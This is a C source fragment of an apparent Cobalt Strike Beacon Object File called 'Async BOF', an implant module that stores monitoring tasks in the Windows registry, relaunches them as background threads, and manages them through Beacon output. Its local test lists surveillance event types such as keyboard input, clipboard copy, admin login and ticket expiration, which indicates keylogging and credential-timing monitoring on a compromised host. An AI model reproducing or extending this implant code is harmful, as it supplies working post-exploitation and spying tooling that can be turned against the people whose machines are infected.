        ADVAPI32$RegCloseKey(hKey);
        return 0;
    }
    
    result = ADVAPI32$RegSetValueExA(hKey, "Parameters", 0, REG_SZ, (const BYTE*)task->params, MSVCRT$strlen(task->params) + 1);
    if (result != ERROR_SUCCESS) {
        ADVAPI32$RegCloseKey(hKey);
        return 0;
    }
    
    DWORD interval = task->interval;
    result = ADVAPI32$RegSetValueExA(hKey, "Interval", 0, REG_DWORD, (const BYTE*)&interval, sizeof(DWORD));
    if (result != ERROR_SUCCESS) {
        ADVAPI32$RegCloseKey(hKey);
        return 0;
    }
    
    DWORD task_id = task->task_id;
    result = ADVAPI32$RegSetValueExA(hKey, "TaskID", 0, REG_DWORD, (const BYTE*)&task_id, sizeof(DWORD));
    
    ADVAPI32$RegCloseKey(hKey);
    return (result == ERROR_SUCCESS) ? 1 : 0;
}

int load_tasks() {
    HKEY hKey;
    DWORD index = 0;
    char task_subkey[256];
    DWORD task_subkey_size = sizeof(task_subkey);
    int loaded_count = 0;
    
    if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\AsyncBOF\\Tasks", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return 0;
    }
    
    while (ADVAPI32$RegEnumKeyExA(hKey, index, task_subkey, &task_subkey_size, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        HKEY hTaskKey;
        char full_subkey[256];
        safe_sprintf(full_subkey, sizeof(full_subkey), "Software\\AsyncBOF\\Tasks\\%s", task_subkey);
        
        if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, full_subkey, 0, KEY_READ, &hTaskKey) == ERROR_SUCCESS) {
            char name[64];
            DWORD name_size = sizeof(name);
            DWORD event_type;
            DWORD event_type_size = sizeof(event_type);
            char params[256];
            DWORD params_size = sizeof(params);
            DWORD interval;
            DWORD interval_size = sizeof(interval);
            DWORD task_id;
            DWORD task_id_size = sizeof(task_id);
            
            if (ADVAPI32$RegQueryValueExA(hTaskKey, "Name", NULL, NULL, (LPBYTE)name, &name_size) == ERROR_SUCCESS &&
                ADVAPI32$RegQueryValueExA(hTaskKey, "EventType", NULL, NULL, (LPBYTE)&event_type, &event_type_size) == ERROR_SUCCESS &&
                ADVAPI32$RegQueryValueExA(hTaskKey, "Parameters", NULL, NULL, (LPBYTE)params, &params_size) == ERROR_SUCCESS &&
                ADVAPI32$RegQueryValueExA(hTaskKey, "Interval", NULL, NULL, (LPBYTE)&interval, &interval_size) == ERROR_SUCCESS &&
                ADVAPI32$RegQueryValueExA(hTaskKey, "TaskID", NULL, NULL, (LPBYTE)&task_id, &task_id_size) == ERROR_SUCCESS) {
                
                async_task_t* task = create_task(name, (event_type_t)event_type, params, interval);
                if (task) {
                    task->task_id = task_id;
                    if (task_id >= next_task_id) {
                        next_task_id = task_id + 1;
                    }
                    
                    task->thread_handle = KERNEL32$CreateThread(NULL, 0, task_thread_proc, task, 0, &task->thread_id);
                    if (task->thread_handle) {
                        loaded_count++;
                    } else {
                        destroy_task(task);
                    }
                }
            }
            
            ADVAPI32$RegCloseKey(hTaskKey);
        }
        
        task_subkey_size = sizeof(task_subkey);
        index++;
    }
    
    ADVAPI32$RegCloseKey(hKey);
    return loaded_count;
}

int cancel_task(unsigned int task_id) {
    async_task_t* current = task_list_head;
    while (current) {
        if (current->task_id == task_id) {
            current->status = TASK_CANCELLED;
            if (current->thread_handle) {
                KERNEL32$CloseHandle(current->thread_handle);
                current->thread_handle = NULL;
            }
            return 1;
        }
        current = current->next;
    }
    return 0;
}

int delete_task(unsigned int task_id) {
    cancel_task(task_id);
    
    char subkey[256];
    safe_sprintf(subkey, sizeof(subkey), "Software\\AsyncBOF\\Tasks\\%d", task_id);
    LONG result = ADVAPI32$RegDeleteKeyA(HKEY_CURRENT_USER, subkey);
    
    if (task_list_head) {
        if (task_list_head->task_id == task_id) {
            async_task_t* temp = task_list_head;
            task_list_head = task_list_head->next;
            MSVCRT$free(temp);
        } else {
            async_task_t* current = task_list_head;
            while (current->next && current->next->task_id != task_id) {
                current = current->next;
            }
            if (current->next) {
                async_task_t* temp = current->next;
                current->next = current->next->next;
                MSVCRT$free(temp);
            }
        }
    }
    
    return (result == ERROR_SUCCESS || result == ERROR_FILE_NOT_FOUND) ? 1 : 0;
}

void list_tasks() {
    BeaconPrintf(0, "[Async BOF] Listing tasks:");
    async_task_t* current = task_list_head;
    int count = 0;
    
    while (current) {
        BeaconPrintf(0, "  - Task '%s' (ID: %d, type: %s, interval: %ds, status: %s)", 
                     current->name, current->task_id, get_event_name(current->event_type), 
                     current->interval, get_task_status_name(current->status));
        current = current->next;
        count++;
    }
    
    if (count == 0) {
        BeaconPrintf(0, "  No active tasks");
    }
}

async_task_t* get_task_by_id(unsigned int task_id) {
    async_task_t* current = task_list_head;
    while (current) {
        if (current->task_id == task_id) {
            return current;
        }
        current = current->next;
    }
    return NULL;
}

// 本地测试功能
#ifndef BOF_BUILD
#ifndef LOCAL_TEST_BUILD
int main(int argc, char* argv[]) {
    printf("Async BOF Local Test\n");
    printf("====================\n");
    
    test_local_functionality();
    
    return 0;
}

void test_local_functionality() {
    printf("Testing Async BOF functionality...\n");
    
    async_task_t* test_task = create_task("TestTask", EVENT_ADMIN_LOGIN, "admin", 30);
    if (test_task) {
        printf("[+] Task created successfully: %s (ID: %d)\n", test_task->name, test_task->task_id);
        
        printf("[*] Testing event monitoring...\n");
        int result = check_event(test_task);
        printf("[*] Event check result: %s\n", result ? "Event detected" : "No event");
        
        if (result) {
            report_event(test_task);
        }
        
        destroy_task(test_task);
        printf("[+] Task cleaned up\n");
    } else {
        printf("[-] Failed to create test task\n");
    }
    
    printf("\n[*] Testing other event types...\n");
    const char* event_names[] = {
        "Admin Login", "Process Start", "User Login", "Network Isolation",
        "VPN Connection", "WiFi Connection", "Ticket Expiration",
        "Clipboard Copy", "Keyboard Input", "User Logon"
    };
    
    for (int i = 0; i < 10; i++) {
        printf("[*] Event Type %d: %s\n", i, event_names[i]);
    }
    
    printf("\n[+] Local test completed\n");
}
#endif
#endif